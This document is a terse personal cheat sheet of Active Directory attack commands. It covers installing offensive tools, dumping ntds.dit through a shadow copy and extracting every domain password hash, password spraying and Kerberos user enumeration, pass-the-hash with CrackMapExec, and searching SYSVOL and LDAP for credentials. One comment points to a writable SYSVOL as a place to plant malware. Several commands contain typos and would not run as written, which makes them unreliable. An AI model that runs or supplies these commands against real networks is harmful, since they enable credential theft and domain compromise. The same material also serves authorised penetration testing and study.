
## Powershell
-- DS Internals PowerShell scripts: https://github.com/MichaelGrafnetter/DSInternals
powershell> Set-ExecutionPolicy Unrestricted
powershell> Install-Module -Name DSInternals

## Kali tools: Impacket, Bloodhound, Kerbrute, crackpmap
$ sudo apt isntall python3-impacket -y
$ sudo apt install bloodhound -y
$ pip install bloodhound
$ git clone https://github.com/ropnop/kerbrute
$ chmod +x kerbrute/kerbrute
$ sudo apt install crackmapexec

## Testing on Windows Server
> reg SAVE HKLM\SYSTEM C:\tmp\sys
> vssamin create shadow/for=C:
> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\dit
> ESENTUTL /p c:\temp\dit /!1024 /8/o

powershell> $key=Get-BootKey -SystemHiveFilePath c:\temp\sys
powershell> Get-ADDBAccount -All -BootKey $key -DBPath c:\temp\dit
-- ntds.dit holds AD information
-- got all hashes

## DomainPasswordSpray
-- https://github.com/dafthack/DomainPasswordSpray
powershell> Import-Module c:\tools\dafthack\DomainPasswordSpray.ps1
powershell> Invoke-DomainPasswordSpray -Password Password1
powershell> Invoke-DomainPasswordSpray -PasswordList c:\tools\dafthack\adpass.txt

## Kerberos brute-forcing attacks (bruteforce, bruteuser, userenum, passwordspray)
$ ./kerbrute userenum -d DOMAIN --dc IP WORDLIST
$ ./kerbrute passwordspray -d DOMAIN --dc IP kuhits NEW_PASSWORD

## Use CrackMapExec to access and enumerate AD
$ crackmapexec smp IP/MASK
$ crackmapexec smb IP -u "USERNAME" -H "PASS_HASH"
$ crackmapexec smb IP -u "USERNAME" -p WORDLIST

## Investigate the SYSVOL share
$ smbclient \\\\IP\\sysvol -U USERNAME
smb: \> dir
smb: \> dir DIRECTORY\*
smb: \> dir DIRECTORY\scripts\*
smb: \> get DIRECTORY\scripts\login.ps1 /dev/tty
-- if the sysvol share is writable from DC, it is good starting point for malware
-- do not need to have local admin to access SYSVOl

## Take advantage of legacy data
$ jxplorer
-- connect to the AD DC
-- investigate the AD, could be some interesting notes (passwords) or base64 encoded data





